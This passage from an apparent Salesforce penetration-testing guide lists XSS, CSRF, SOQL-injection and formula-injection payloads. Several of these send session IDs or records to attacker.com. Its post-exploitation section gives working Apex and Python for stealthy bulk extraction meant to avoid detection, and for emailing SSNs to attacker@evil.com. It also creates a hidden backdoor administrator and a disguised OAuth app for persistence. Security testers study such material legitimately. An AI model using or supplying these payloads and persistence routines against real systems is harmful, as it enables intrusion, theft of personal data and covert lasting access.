<!-- Basic XSS payload -->
<script>alert('XSS')</script>

<!-- Event handler XSS -->
<img src="x" onerror="alert('XSS')">

<!-- JavaScript protocol -->
<a href="javascript:alert('XSS')">Click</a>

<!-- Advanced payload for data extraction -->
<script>
fetch('/services/data/v52.0/sobjects/User/', {
    headers: {'Authorization': 'Bearer ' + '{!$Api.Session_ID}'}
}).then(r=>r.json()).then(d=>fetch('http://attacker.com/exfil?data='+btoa(JSON.stringify(d))));
</script>

<!-- SVG-based XSS -->
<svg/onload=alert(document.domain)>

<!-- Style-based XSS -->
<div style="animation-name:rotation" onanimationstart="alert(1)" x="">
```

**CSRF Vulnerability Testing**:
```html
<!-- Test CSRF protection -->
<form action="/apex/VulnerablePage" method="POST">
    <input type="hidden" name="action" value="deleteRecord">
    <input type="hidden" name="recordId" value="001XX000003DHPt">
    <input type="submit" value="Delete Account">
</form>

<!-- Advanced CSRF with AJAX -->
<script>
fetch('/apex/VulnerablePage', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'action=modifyUser&userId=005XX000001b0Qw&isActive=false'
});
</script>
```

**Information Disclosure Assessment**:
```html
<!-- Check for sensitive data exposure -->
<apex:page showHeader="false">
    Session ID: {!$Api.Session_ID}
    User ID: {!$User.Id}
    Organization ID: {!$Organization.Id}
    
    <!-- Debug information exposure -->
    <apex:pageMessages />
    
    <!-- Server-side debugging -->
    <apex:outputText value="{!debugInfo}" escape="false"/>
</apex:page>
```

**Impact**: Session hijacking, credential theft, unauthorized actions.

### 4. Lightning Component Security

**Objective**: Assess Lightning component security and client-side vulnerabilities.

**Component Discovery**:
```sql
-- Lightning Web Components
SELECT Id, DeveloperName, Description, Source
FROM LightningComponentBundle 
WHERE IsDeleted = false

-- Aura Components  
SELECT Id, DeveloperName, Description, Source
FROM AuraDefinitionBundle 
WHERE IsDeleted = false
```

**Client-Side Vulnerabilities**:
```javascript
// VULNERABLE: Exposing sensitive data in component events
({
    sendData: function(component, event, helper) {
        var sensitiveData = component.get("v.sessionId");
        var evt = $A.get("e.c:DataEvent");
        evt.setParams({
            "data": sensitiveData // Sensitive data in event
        });
        evt.fire();
    }
})

// VULNERABLE: Client-side validation only
({
    validateInput: function(component, event, helper) {
        var isValid = true; // Client-side only validation
        if (isValid) {
            helper.performSensitiveAction(component);
        }
    }
})

// VULNERABLE: Unsafe DOM manipulation
({
    updateContent: function(component, event, helper) {
        var userInput = event.getParam('input');
        var element = component.find("content").getElement();
        element.innerHTML = userInput; // XSS risk
    }
})
```

**Content Security Policy Testing**:
```javascript
// Test CSP bypass attempts
try {
    eval('alert("CSP Bypass")');
} catch(e) {
    console.log('CSP blocking eval');
}

// Test unsafe-inline script execution
document.body.innerHTML += '<script>alert("Inline script")</script>';

// Test external resource loading
var script = document.createElement('script');
script.src = 'https://attacker.com/malicious.js';
document.head.appendChild(script);
```

**Lightning Locker Service Assessment**:
```javascript
// Test Locker Service restrictions
({
    testLockerService: function(component, event, helper) {
        try {
            // Attempt DOM manipulation outside component
            document.getElementById('external-element').innerHTML = 'Modified';
        } catch(e) {
            console.log('Locker Service blocking DOM access');
        }
        
        try {
            // Attempt global variable access
            window.sensitiveGlobalVar = 'compromised';
        } catch(e) {
            console.log('Locker Service blocking global access');
        }
    }
})
```

**Impact**: Client-side code execution, component manipulation, data exposure.

---

## Platform Configuration Security

### 1. Critical Security Settings Audit

**Objective**: Review platform-wide security configurations for misconfigurations.

**Network Security Configuration**:
```sql
-- IP restrictions analysis
SELECT Id, IpAddress, IpAddressMask, Description, CreatedDate
FROM IpRestriction 
ORDER BY CreatedDate DESC

-- Login IP ranges by profile
SELECT Id, Profile.Name, StartAddress, EndAddress
FROM LoginIpRange 
ORDER BY Profile.Name
```

**Session Security Settings** (Setup → Security → Session Settings):
- Lock sessions to IP address: ✓ Enabled
- Lock sessions to domain: ✓ Enabled  
- Force relogin after Login-As-User: ✓ Enabled
- Enable clickjack protection: ✓ Enabled
- Enable Content Sniffing protection: ✓ Enabled
- Enable XSS protection: ✓ Enabled
- Require HttpOnly attribute: ✓ Enabled
- Require Secure attribute: ✓ Enabled

**Password Policy Assessment**:
```sql
-- Comprehensive password policy analysis
SELECT Id, MinPasswordLength, PasswordComplexity, PasswordExpiration,
       PasswordHistoryRestriction, MaxLoginAttempts, LockoutInterval,
       MinPasswordAge, PasswordQuestion, QuestionRestriction
FROM PasswordPolicy

-- Password policy variations by profile
SELECT Id, Profile.Name, MinPasswordLength, PasswordComplexity
FROM ProfilePasswordPolicy 
ORDER BY Profile.Name
```

**Impact**: Misconfigurations create attack vectors for session hijacking and brute force attacks.

### 2. API Security Configuration

**Objective**: Evaluate API access controls and identify abuse vectors.

**API Access Analysis**:
```sql
-- Profile API permissions
SELECT Id, Name, PermissionsApiEnabled, PermissionsApiUserOnly,
       PermissionsBulkApiHardDelete, PermissionsConnectOrgToEnvironmentHub
FROM Profile 
WHERE PermissionsApiEnabled = true

-- API usage statistics
SELECT Id, Application, Identifier, Type, Status, 
       RequestsLast24Hours, RequestsLastHour
FROM ApiUsage 
ORDER BY RequestsLast24Hours DESC

-- REST API endpoints analysis
SELECT Id, DeveloperName, NamespacePrefix, HttpMethods, 
       Description, Status
FROM RestResource 
WHERE Status = 'Active'
```

**Connected Apps Security Review**:
```sql
-- Connected applications configuration
SELECT Id, Name, ContactEmail, CallbackUrl, ConsumerKey, 
       CreatedDate, Description, OptionsFullScopeApprovals,
       OptionsRefreshTokenValidityMetric, RefreshTokenValidityPeriod
FROM ConnectedApplication 
ORDER BY CreatedDate DESC

-- OAuth policies analysis
SELECT Id, ConnectedApp.Name, PolicyType, PolicyValue, 
       Description, CreatedDate
FROM ConnectedAppOauthPolicy
```

**API Rate Limiting Testing**:
```python
def test_api_rate_limits(base_url, session_id, num_requests=1000):
    """Test API rate limiting implementation"""
    headers = {
        'Authorization': f'Bearer {session_id}',
        'Content-Type': 'application/json'
    }
    
    successful_requests = 0
    rate_limited_requests = 0
    
    def make_request():
        nonlocal successful_requests, rate_limited_requests
        try:
            response = requests.get(
                f"{base_url}/services/data/v52.0/sobjects/",
                headers=headers,
                timeout=5
            )
            if response.status_code == 200:
                successful_requests += 1
            elif response.status_code == 429:
                rate_limited_requests += 1
        except Exception as e:
            print(f"Request failed: {e}")
    
    # Rapid fire requests
    threads = []
    for i in range(num_requests):
        thread = threading.Thread(target=make_request)
        threads.append(thread)
        thread.start()
        
        if i % 100 == 0:
            time.sleep(0.1)
    
    for thread in threads:
        thread.join()
    
    print(f"Successful: {successful_requests}, Rate limited: {rate_limited_requests}")
    if rate_limited_requests == 0:
        print("WARNING: No rate limiting detected")
```

**Impact**: Uncontrolled API access enables mass data extraction and abuse.

### 3. Data Loss Prevention Assessment

**Objective**: Evaluate data loss prevention controls and identify leakage vectors.

**Email Security Configuration**:
```sql
-- Email deliverability settings
SELECT Id, BounceManagementCompliance, IsActive
FROM EmailDomainKey

-- Email relay restrictions
SELECT Id, EmailAddress, IsActive, CreatedDate
FROM EmailRelay 
WHERE IsActive = true
```

**File Upload/Download Controls**:
```sql
-- Content delivery settings
SELECT Id, DomainName, Type, IsActive, CreatedDate
FROM ContentDomain

-- File sharing settings analysis
SELECT Id, Name, ShareType, ExpirationDate, AllowDownload, 
       AllowPreview, IsPasswordRequired
FROM ContentDistribution 
WHERE ExpirationDate > TODAY OR ExpirationDate = null
```

**External Sharing Assessment**:
```sql
-- External sharing rules
SELECT Id, Name, AccountAccessLevel, Description, 
       SharedToType, SharedTo
FROM AccountSharingRule 
WHERE SharedToType IN ('Group', 'Role', 'RoleAndSubordinates')

-- Guest user sharing
SELECT Id, ShareWithId, AccessLevel, RowCause
FROM AccountShare 
WHERE ShareWithId IN (SELECT Id FROM User WHERE UserType = 'Guest')
```

**Impact**: Inadequate DLP controls enable unauthorized data sharing and exfiltration.

---

## API Security Testing

### 1. REST API Security Assessment

**Objective**: Comprehensive REST API security testing including authentication bypass and injection vulnerabilities.

**API Endpoint Discovery**:
```bash
# Standard Salesforce REST endpoints
/services/data/                    # Data API
/services/data/v52.0/sobjects/     # SObject API
/services/data/v52.0/query/        # SOQL Query
/services/data/v52.0/search/       # SOSL Search
/services/data/v52.0/analytics/    # Analytics API
/services/apexrest/                # Custom Apex REST
/services/async/                   # Bulk API

# Custom endpoint enumeration
curl -H "Authorization: Bearer $TOKEN" \
  "https://instance.salesforce.com/services/apexrest/" | \
  grep -oP '(?<=href=")[^"]*'
```

**Authentication Security Testing**:
```bash
# Test with invalid token
curl -i -H "Authorization: Bearer invalid_token_12345" \
  "https://instance.salesforce.com/services/data/v52.0/sobjects/"

# Test with expired token
curl -i -H "Authorization: Bearer expired_token" \
  "https://instance.salesforce.com/services/data/v52.0/sobjects/"

# Test token reuse across different IPs
curl -i -H "Authorization: Bearer $VALID_TOKEN" \
  -H "X-Forwarded-For: 192.168.1.100" \
  "https://instance.salesforce.com/services/data/v52.0/sobjects/"
```

**Authorization Bypass Testing**:
```bash
# Test IDOR - access records owned by other users
curl -H "Authorization: Bearer $USER_TOKEN" \
  "https://instance.salesforce.com/services/data/v52.0/sobjects/Account/001XX000003DHPt"

# Test privilege escalation via API
curl -X PATCH \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProfileId":"00eXX0000000001"}' \
  "https://instance.salesforce.com/services/data/v52.0/sobjects/User/005XX000001b0Qw"

# Test permission set assignment
curl -X POST \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"PermissionSetId":"0PS000000000001","AssigneeId":"005XX000001b0Qw"}' \
  "https://instance.salesforce.com/services/data/v52.0/sobjects/PermissionSetAssignment/"
```

**Injection Attack Testing**:
```bash
# SOQL injection via query parameter
curl -G -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=SELECT Id FROM Account WHERE Name = 'test' UNION SELECT Id FROM User--" \
  "https://instance.salesforce.com/services/data/v52.0/query/"

# Advanced data extraction attempt
curl -G -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=SELECT Id FROM Account WHERE Name = 'x' OR (SELECT COUNT() FROM User WHERE Profile.Name = 'System Administrator') > 0--" \
  "https://instance.salesforce.com/services/data/v52.0/query/"

# SOSL injection testing
curl -G -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "q=FIND 'test' RETURNING Account(Id), User(Id, Email, Profile.Name)" \
  "https://instance.salesforce.com/services/data/v52.0/search/"
```

**Impact**: Unauthorized API access, data manipulation, privilege escalation.

### 2. Bulk API Security Assessment

**Objective**: Test Bulk API for data exfiltration capabilities and security controls.

**Bulk API Data Extraction Testing**:
```python
import requests
import xml.etree.ElementTree as ET

class BulkAPITester:
    def __init__(self, session_id, instance_url):
        self.session_id = session_id
        self.instance_url = instance_url
        self.bulk_endpoint = f"{instance_url}/services/async/52.0"
    
    def create_bulk_job(self, sobject_type, operation='query'):
        """Create a bulk API job"""
        job_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
        <jobInfo xmlns="http://www.force.com/2009/06/async/dataloader">
            <operation>{operation}</operation>
            <object>{sobject_type}</object>
            <contentType>CSV</contentType>
        </jobInfo>"""
        
        headers = {
            'X-SFDC-Session': self.session_id,
            'Content-Type': 'application/xml'
        }
        
        response = requests.post(
            f"{self.bulk_endpoint}/job",
            data=job_xml,
            headers=headers
        )
        
        if response.status_code == 201:
            root = ET.fromstring(response.content)
            job_id = root.find('.//{http://www.force.com/2009/06/async/dataloader}id').text
            return job_id
        else:
            print(f"Job creation failed: {response.status_code}")
            return None
    
    def add_batch(self, job_id, query):
        """Add batch to bulk job"""
        headers = {
            'X-SFDC-Session': self.session_id,
            'Content-Type': 'text/csv'
        }
        
        response = requests.post(
            f"{self.bulk_endpoint}/job/{job_id}/batch",
            data=query,
            headers=headers
        )
        
        if response.status_code == 201:
            root = ET.fromstring(response.content)
            batch_id = root.find('.//{http://www.force.com/2009/06/async/dataloader}id').text
            return batch_id
        else:
            print(f"Batch creation failed: {response.status_code}")
            return None
    
    def test_bulk_extraction(self, sobject_type, sensitive_fields):
        """Test bulk data extraction"""
        job_id = self.create_bulk_job(sobject_type)
        if not job_id:
            return False
        
        query = f"SELECT Id, {', '.join(sensitive_fields)} FROM {sobject_type}"
        batch_id = self.add_batch(job_id, query)
        
        if not batch_id:
            return False
        
        print(f"Bulk extraction job created: {job_id}, batch: {batch_id}")
        return True

# Usage
tester = BulkAPITester(session_id, instance_url)
sensitive_fields = ['Name', 'Email', 'Phone', 'SSN__c']
tester.test_bulk_extraction('Contact', sensitive_fields)
```

**Impact**: Bulk data exfiltration capability assessment.

### 3. SOAP API Security Testing

**Objective**: Assess SOAP API security including XML injection and session handling.

**SOAP Session Testing**:
```xml
<!-- Test session hijacking via SOAP -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:urn="urn:enterprise.soap.sforce.com">
    <soapenv:Header>
        <urn:SessionHeader>
            <urn:sessionId>CAPTURED_SESSION_ID</urn:sessionId>
        </urn:SessionHeader>
    </soapenv:Header>
    <soapenv:Body>
        <urn:query>
            <urn:queryString>SELECT Id, Name FROM Account LIMIT 5</urn:queryString>
        </urn:query>
    </soapenv:Body>
</soapenv:Envelope>
```

**XML Injection Testing**:
```xml
<!-- SOAP SOQL injection test -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:urn="urn:enterprise.soap.sforce.com">
    <soapenv:Header>
        <urn:SessionHeader>
            <urn:sessionId>SESSION_ID</urn:sessionId>
        </urn:SessionHeader>
    </soapenv:Header>
    <soapenv:Body>
        <urn:query>
            <urn:queryString>SELECT Id FROM Account WHERE Name = 'test' UNION SELECT Password__c FROM User--</urn:queryString>
        </urn:query>
    </soapenv:Body>
</soapenv:Envelope>
```

**Impact**: Session hijacking, injection attacks, unauthorized data access.

---

## Integration Security Assessment

### 1. Connected Apps Security Review

**Objective**: Assess OAuth implementations and connected application security.

**Connected Apps Analysis**:
```sql
-- Comprehensive connected apps analysis
SELECT Id, Name, ContactEmail, CallbackUrl, ConsumerKey, 
       CreatedDate, CreatedBy.Name, Description, MobileSessionTimeout,
       RefreshTokenValidityPeriod, UsersCanSelfAuthorize,
       OptionsFullScopeApprovals
FROM ConnectedApplication 
ORDER BY CreatedDate DESC

-- OAuth flow analysis
SELECT Id, App.Name, UserId, User.Username, User.Email, 
       IssuedDate, ExpirationDate, UseCount, LastUsedDate,
       Scopes, RedirectUri
FROM OAuth2Authorization 
ORDER BY LastUsedDate DESC NULLS LAST

-- Refresh token analysis
SELECT Id, AppName, User.Username, User.Email, UseCount,
       LastUsedDate, IssuedDate, ExpirationDate
FROM OAuth2PeriodicRefreshToken 
ORDER BY LastUsedDate DESC
```

**OAuth Security Testing**:
```python
def test_oauth_flow(client_id, redirect_uri, authorization_endpoint):
    """Test OAuth authorization code flow security"""
    # Standard authorization request
    auth_url = f"{authorization_endpoint}?" \
               f"client_id={client_id}&" \
               f"redirect_uri={redirect_uri}&" \
               f"response_type=code&" \
               f"scope=full"
    
    print(f"Authorization URL: {auth_url}")
    
    # Test redirect URI manipulation
    malicious_redirect = "https://attacker.com/callback"
    malicious_url = f"{authorization_endpoint}?" \
                   f"client_id={client_id}&" \
                   f"redirect_uri={malicious_redirect}&" \
                   f"response_type=code&" \
                   f"scope=full"
    
    print(f"Malicious redirect test: {malicious_url}")
    
    # Test state parameter absence (CSRF protection)
    no_state_url = f"{authorization_endpoint}?" \
                  f"client_id={client_id}&" \
                  f"redirect_uri={redirect_uri}&" \
                  f"response_type=code&" \
                  f"scope=full"
    
    print(f"No state parameter: {no_state_url}")

# Token validation testing
def test_token_security(access_token, refresh_token, client_id):
    """Test OAuth token security"""
    # Test token with different scopes
    response = requests.get(
        "https://instance.salesforce.com/services/data/v52.0/sobjects/User/",
        headers={"Authorization": f"Bearer {access_token}"}
    )
    
    # Test refresh token reuse
    refresh_response = requests.post(
        "https://instance.salesforce.com/services/oauth2/token",
        data={
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
            "client_id": client_id
        }
    )
```

**Impact**: OAuth hijacking, unauthorized app access, token abuse.

### 2. Named Credentials Security Assessment

**Objective**: Evaluate external service integration security and credential management.

**Named Credentials Analysis**:
```sql
-- Named credentials configuration
SELECT Id, DeveloperName, Endpoint, PrincipalType, Protocol,
       AuthTokenEndpointUrl, JwtAudience, JwtIssuer,
       Username
FROM NamedCredential

-- External services using named credentials
SELECT Id, DeveloperName, ExternalServiceProviderId, 
       Description, Status
FROM ExternalServiceRegistration
```

**External Service Security Testing**:
```apex
// Test named credential security
public class NamedCredentialTester {
    public static void testExternalCall(String namedCredential) {
        HttpRequest req = new HttpRequest();
        req.setEndpoint('callout:' + namedCredential + '/api/sensitive-data');
        req.setMethod('GET');
        
        Http http = new Http();
        try {
            HttpResponse res = http.send(req);
            System.debug('Response: ' + res.getStatusCode());
            System.debug('Body: ' + res.getBody());
        } catch (Exception e) {
            System.debug('Error: ' + e.getMessage());
        }
    }
}
```

**Certificate Validation Testing**:
```python
def test_certificate_validation(endpoint):
    """Test SSL certificate validation"""
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    try:
        # Test with invalid certificate
        response = requests.get(endpoint, verify=False, timeout=10)
        print(f"Insecure connection accepted: {response.status_code}")
    except Exception as e:
        print(f"Insecure connection rejected: {e}")
    
    try:
        # Test with proper certificate validation
        response = requests.get(endpoint, verify=True, timeout=10)
        print(f"Secure connection successful: {response.status_code}")
    except Exception as e:
        print(f"Certificate validation failed: {e}")
```

**Impact**: Man-in-the-middle attacks, credential compromise, external service abuse.

---

## Advanced Attack Vectors

### 1. Formula Injection Attacks

**Objective**: Identify and exploit formula injection vulnerabilities in calculated fields and validation rules.

**Formula Field Discovery**:
```sql
-- Formula fields with potential injection risks
SELECT Id, QualifiedApiName, Label, FormulaSourceText,
       EntityDefinition.QualifiedApiName as ObjectName
FROM FieldDefinition 
WHERE DataType IN ('Text', 'Url') 
  AND FormulaSourceText != null 
  AND (FormulaSourceText LIKE '%HYPERLINK%' OR FormulaSourceText LIKE '%IMAGE%')

-- Validation rules with formulas
SELECT Id, ValidationName, ErrorConditionFormula, ErrorMessage,
       EntityDefinition.QualifiedApiName as ObjectName, IsActive
FROM ValidationRule 
WHERE IsActive = true 
  AND (ErrorConditionFormula LIKE '%HYPERLINK%' OR ErrorConditionFormula LIKE '%TEXT%')
```

**Formula Injection Payloads**:
```javascript
// Information disclosure
HYPERLINK("http://attacker.com/exfil?session=" & $Api.Session_ID, "Click Here")

// User context information
HYPERLINK("http://attacker.com/exfil?user=" & $User.Id & "&org=" & $Organization.Id, "Link")

// Cross-site scripting via formulas
HYPERLINK("javascript:alert('XSS via Formula')", "Click for XSS")

// Advanced payload with data exfiltration
HYPERLINK("javascript:void((function(){var s=document.createElement('script');s.src='//attacker.com/steal.js';document.head.appendChild(s);})())", "Malicious Link")

// File system access (if enabled)
HYPERLINK("file:///etc/passwd", "System Files")
HYPERLINK("\\\\attacker.com\\share\\malicious.exe", "Network Resource")
```

**Automated Formula Injection Testing**:
```apex
public class FormulaInjectionTester {
    public static void testFormulaInjection(String objectName, String fieldName) {
        Schema.SObjectType objectType = Schema.getGlobalDescribe().get(objectName);
        SObject testRecord = objectType.newSObject();
        
        List<String> payloads = new List<String>{
            '<script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '"><script>alert("XSS")</script>',
            '\';alert("XSS");var a=\'',
            'http://attacker.com/steal?data='
        };
        
        for (String payload : payloads) {
            try {
                testRecord.put(fieldName, payload);
                insert testRecord;
                
                String query = 'SELECT Id, ' + fieldName + ' FROM ' + objectName + 
                              ' WHERE Id = \'' + testRecord.Id + '\'';
                List<SObject> results = Database.query(query);
                
                if (!results.isEmpty()) {
                    String resultValue = String.valueOf(results[0].get(fieldName));
                    if (resultValue.contains('javascript:') || resultValue.contains('<script>')) {
                        System.debug('Potential formula injection: ' + payload);
                    }
                }
                
                delete testRecord;
            } catch (Exception e) {
                System.debug('Payload blocked: ' + payload + ' - ' + e.getMessage());
            }
        }
    }
}
```

**Impact**: Information disclosure, client-side code execution, data exfiltration.

### 2. Process Automation Exploitation

**Objective**: Identify security vulnerabilities in Process Builder, Flow, and Workflow automation.

**Process & Flow Discovery**:
```sql
-- Active processes and flows
SELECT Id, DeveloperName, ProcessType, Status, Description,
       LastModifiedDate, LastModifiedBy.Name, TriggerType
FROM Flow 
WHERE Status = 'Active' 
  AND ProcessType IN ('Flow', 'Workflow', 'AutoLaunchedFlow')

-- Process builder definitions
SELECT Id, Name, Type, State, Description, TableEnumOrId,
       CreatedDate, LastModifiedDate, LastModifiedBy.Name
FROM ProcessDefinition 
WHERE State = 'Active'

-- Flow interviews (execution instances)
SELECT Id, Name, CurrentElement, FlowVersionView.ProcessType,
       StartTime, PauseTime, CreatedDate, CreatedBy.Name
FROM FlowInterview 
WHERE CreatedDate = TODAY 
ORDER BY StartTime DESC
```

**Process Automation Security Testing**:
```apex
// Test flow input validation
public class FlowSecurityTester {
    public static void testFlowInputValidation(String flowApiName) {
        Map<String, Object> inputVariables = new Map<String, Object>();
        
        // Injection payloads for flow inputs
        inputVariables.put('textInput', '<script>alert("XSS")</script>');
        inputVariables.put('emailInput', 'test@example.com; DELETE FROM Account;');
        inputVariables.put('numberInput', '1; DROP TABLE User;');
        
        try {
            Flow.Interview flowInterview = Flow.Interview.createInterview(flowApiName, inputVariables);
            flowInterview.start();
            System.debug('Flow executed with malicious input');
        } catch (Exception e) {
            System.debug('Flow execution blocked: ' + e.getMessage());
        }
    }
}

// Test for privilege escalation in system context
public class PrivilegeEscalationTest {
    public static void testSystemContextAbuse() {
        Profile standardProfile = [SELECT Id FROM Profile WHERE Name = 'Standard User' LIMIT 1];
        User testUser = new User(
            Username = 'lowpriv@test.com',
            Email = 'lowpriv@test.com',
            LastName = 'LowPriv',
            Alias = 'lowpriv',
            ProfileId = standardProfile.Id,
            TimeZoneSidKey = 'America/New_York',
            LocaleSidKey = 'en_US',
            EmailEncodingKey = 'UTF-8',
            LanguageLocaleKey = 'en_US'
        );
        insert testUser;
        
        System.runAs(testUser) {
            Account testAccount = new Account(Name = 'Privilege Escalation Test');
            insert testAccount;
            
            try {
                List<User> adminUsers = [SELECT Id FROM User WHERE Profile.Name = 'System Administrator'];
                if (!adminUsers.isEmpty()) {
                    System.debug('Unauthorized access to admin users via process');
                }
            } catch (Exception e) {
                System.debug('Process properly enforced security: ' + e.getMessage());
            }
        }
    }
}
```

**Impact**: Automated privilege escalation, system abuse, data manipulation.

### 3. Metadata API Security Exploitation

**Objective**: Test metadata manipulation capabilities for security control bypass.

**Metadata API Access Testing**:
```xml
<!-- Test metadata retrieval -->
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                  xmlns:met="http://soap.sforce.com/2006/04/metadata">
    <soapenv:Header>
        <met:SessionHeader>
            <met:sessionId>SESSION_ID</met:sessionId>
        </met:SessionHeader>
    </soapenv:Header>
    <soapenv:Body>
        <met:listMetadata>
            <met:queries>
                <met:type>Profile</met:type>
            </met:queries>
            <met:asOfVersion>52.0</met:asOfVersion>
        </met:listMetadata>
    </soapenv:Body>
</soapenv:Envelope>
```

**Security Control Bypass Attempts**:
```xml
<!-- Attempt to modify profile permissions -->
<Profile xmlns="http://soap.sforce.com/2006/04/metadata">
    <fullName>Standard User</fullName>
    <userPermissions>
        <enabled>true</enabled>
        <name>ModifyAllData</name>
    </userPermissions>
    <userPermissions>
        <enabled>true</enabled>
        <name>ViewAllData</name>
    </userPermissions>
</Profile>

<!-- Disable security validation rules -->
<ValidationRule xmlns="http://soap.sforce.com/2006/04/metadata">
    <fullName>Security_Validation_Rule</fullName>
    <active>false</active>
    <errorConditionFormula>false</errorConditionFormula>
    <errorMessage>Bypassed security validation</errorMessage>
</ValidationRule>
```

**Metadata Deployment Testing**:
```python
def test_metadata_deployment(session_id, instance_url, metadata_xml):
    """Test metadata deployment capabilities"""
    import base64
    
    encoded_metadata = base64.b64encode(metadata_xml.encode()).decode()
    
    deployment_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
                      xmlns:met="http://soap.sforce.com/2006/04/metadata">
        <soapenv:Header>
            <met:SessionHeader>
                <met:sessionId>{session_id}</met:sessionId>
            </met:SessionHeader>
        </soapenv:Header>
        <soapenv:Body>
            <met:deploy>
                <met:ZipFile>{encoded_metadata}</met:ZipFile>
                <met:DeployOptions>
                    <met:allowMissingFiles>false</met:allowMissingFiles>
                    <met:autoUpdatePackage>false</met:autoUpdatePackage>
                    <met:checkOnly>true</met:checkOnly>
                    <met:ignoreWarnings>false</met:ignoreWarnings>
                    <met:performRetrieve>false</met:performRetrieve>
                    <met:rollbackOnError>true</met:rollbackOnError>
                    <met:singlePackage>true</met:singlePackage>
                </met:DeployOptions>
            </met:deploy>
        </soapenv:Body>
    </soapenv:Envelope>"""
    
    headers = {
        'Content-Type': 'text/xml; charset=UTF-8',
        'SOAPAction': 'deploy'
    }
    
    response = requests.post(
        f"{instance_url}/services/Soap/m/52.0",
        data=deployment_xml,
        headers=headers
    )
    
    if response.status_code == 200:
        print("Metadata deployment test completed")
        return response.text
    else:
        print(f"Metadata deployment failed: {response.status_code}")
        return None
```

**Impact**: Security control bypass, unauthorized configuration changes.

---

## Post-Exploitation & Persistence

### 1. Data Exfiltration Techniques

**Objective**: Methods for extracting data after gaining unauthorized access.

**Bulk Data Extraction**:
```sql
-- Comprehensive data extraction queries
SELECT Id, Name, Email, Phone, SSN__c, Credit_Card__c 
FROM Contact 
LIMIT 50000

-- Incremental extraction to avoid detection
SELECT Id, Name, AnnualRevenue, LastModifiedDate 
FROM Account 
WHERE LastModifiedDate > 2023-01-01T00:00:00Z

-- Relationship traversal for connected data
SELECT Id, Name, (SELECT Id, Email, Phone FROM Contacts) 
FROM Account

-- Financial data extraction
SELECT Id, Name, Amount, CloseDate, StageName,
       (SELECT Id, Name FROM Account) 
FROM Opportunity 
WHERE Amount > 100000
```

**Stealth Extraction Methods**:
```python
def stealth_data_extraction(session_id, instance_url):
    """Extract data using small, frequent queries to avoid detection"""
    import time
    import random
    
    headers = {'Authorization': f'Bearer {session_id}'}
    extracted_data = []
    
    # Small batch sizes with random delays
    batch_size = 50
    delay_range = (5, 15)  # 5-15 seconds between requests
    
    offset = 0
    while True:
        query = f"SELECT Id, Name, Email FROM Contact LIMIT {batch_size} OFFSET {offset}"
        
        response = requests.get(
            f"{instance_url}/services/data/v52.0/query",
            headers=headers,
            params={'q': query}
        )
        
        if response.status_code == 200:
            data = response.json()
            if not data['records']:
                break
                
            extracted_data.extend(data['records'])
            offset += batch_size
            
            # Random delay to avoid detection
            time.sleep(random.uniform(*delay_range))
        else:
            break
    
    return extracted_data
```

**Alternative Exfiltration Channels**:
```apex
// Email-based exfiltration
public class EmailExfiltration {
    public static void exfiltrateViaEmail() {
        List<Contact> sensitiveContacts = [SELECT Id, Name, Email, SSN__c FROM Contact LIMIT 100];
        
        String csvData = 'Name,Email,SSN\n';
        for (Contact c : sensitiveContacts) {
            csvData += c.Name + ',' + c.Email + ',' + c.SSN__c + '\n';
        }
        
        Messaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();
        email.setToAddresses(new String[]{'attacker@evil.com'});
        email.setSubject('Data Export');
        email.setPlainTextBody(csvData);
        
        Messaging.sendEmail(new Messaging.SingleEmailMessage[]{email});
    }
}

// HTTP callout exfiltration
public class HttpExfiltration {
    @future(callout=true)
    public static void exfiltrateViaHttp() {
        List<Account> accounts = [SELECT Id, Name, AnnualRevenue FROM Account LIMIT 100];
        
        String jsonData = JSON.serialize(accounts);
        
        HttpRequest req = new HttpRequest();
        req.setEndpoint('https://attacker.com/collect');
        req.setMethod('POST');
        req.setBody(jsonData);
        
        Http http = new Http();
        HttpResponse res = http.send(req);
    }
}
```

**Impact**: Intellectual property theft, compliance violations, competitive advantage loss.

### 2. Persistence Mechanisms

**Objective**: Techniques for maintaining access to compromised systems.

**Backdoor User Creation**:
```apex
public class PersistenceManager {
    public static void createBackdoorUser() {
        // Create hidden administrative user
        Profile adminProfile = [SELECT Id FROM Profile WHERE Name = 'System Administrator' LIMIT 1];
        
        User backdoorUser = new User(
            Username = 'maintenance@company-domain.com',
            Email = 'maintenance@company-domain.com',
            FirstName = 'System',
            LastName = 'Maintenance',
            Alias = 'sysmaint',
            ProfileId = adminProfile.Id,
            TimeZoneSidKey = 'America/New_York',
            LocaleSidKey = 'en_US',
            EmailEncodingKey = 'UTF-8',
            LanguageLocaleKey = 'en_US',
            IsActive = true
        );
        
        insert backdoorUser;
        
        // Assign additional permissions
        PermissionSet adminPermSet = [SELECT Id FROM PermissionSet WHERE Name = 'Custom_Admin_Access' LIMIT 1];
        PermissionSetAssignment psa = new PermissionSetAssignment(
            PermissionSetId = adminPermSet.Id,
            AssigneeId = backdoorUser.Id
        );
        insert psa;
    }
}
```

**Connected App Persistence**:
```xml
<!-- Register persistent OAuth application -->
<ConnectedApplication xmlns="http://soap.sforce.com/2006/04/metadata">
    <fullName>MaintenanceApp</fullName>
    <label>System Maintenance Tool</label>
    <contactEmail>maintenance@company.com</contactEmail>
    <description>Internal system maintenance application</description>
    <oauthConfig>
        <callbackUrl>https://maintenance.company.com/callback</callbackUrl>
        <scopes>Full</scopes>
        <consumerKey>HIDDEN_CONSUMER_KEY</consumerKey>
        <consumerSecret>HIDDEN_CONSUMER_SECRET</consumerSecret>
    </oauthConfig>
</ConnectedApplication>
```

**Scheduled Job Implantation**:
```apex
